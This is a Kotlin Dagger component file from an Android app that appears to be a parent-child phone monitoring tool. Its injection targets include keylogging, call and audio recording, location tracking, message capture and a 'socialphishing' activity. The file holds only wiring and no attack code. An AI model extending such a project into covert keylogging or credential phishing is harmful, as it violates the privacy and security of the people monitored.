package com.github.dakoyaki.dash.di.component

import com.github.dakoyaki.dash.data.model.NotificationMessages
import com.github.dakoyaki.dash.di.PerActivity
import com.github.dakoyaki.dash.di.module.ActivityModule
import com.github.dakoyaki.dash.ui.activities.mainparent.MainParentActivity
import com.github.dakoyaki.dash.ui.activities.register.RegisterActivity
import com.github.dakoyaki.dash.ui.activities.login.LoginActivity
import com.github.dakoyaki.dash.ui.activities.mainchild.MainChildActivity
import com.github.dakoyaki.dash.ui.activities.socialphishing.SocialActivityM
import com.github.dakoyaki.dash.ui.fragments.calls.CallsFragment
import com.github.dakoyaki.dash.ui.fragments.photo.PhotoFragment
import com.github.dakoyaki.dash.ui.fragments.keylog.KeysFragment
import com.github.dakoyaki.dash.ui.fragments.maps.MapsFragment
import com.github.dakoyaki.dash.ui.fragments.message.MessageFragment
import com.github.dakoyaki.dash.ui.fragments.notifications.NotifyMessageFragment
import com.github.dakoyaki.dash.ui.fragments.recording.RecordingFragment
import com.github.dakoyaki.dash.ui.fragments.social.SocialFragment
import dagger.Component

/**
 * Created by dakoyaki on 15/12/20.
 */
@PerActivity
@Component(dependencies = [AppComponent::class],modules = [ActivityModule::class])
interface ActivityComponent {

    fun inject(loginActivity: LoginActivity)
    fun inject(registerActivity: RegisterActivity)
    fun inject(mainParentActivity: MainParentActivity)
    fun inject(mainChildActivity: MainChildActivity)
    fun inject(socialActivityM: SocialActivityM)
    fun inject(mapsFragment: MapsFragment)
    fun inject(callsFragment: CallsFragment)
    fun inject(messageFragment: MessageFragment)
    fun inject(photoFragment: PhotoFragment)
    fun inject(keysFragment: KeysFragment)
    fun inject(socialFragment: SocialFragment)
    fun inject(recordingFragment: RecordingFragment)
    fun inject(notifyMessageFragment: NotifyMessageFragment)

}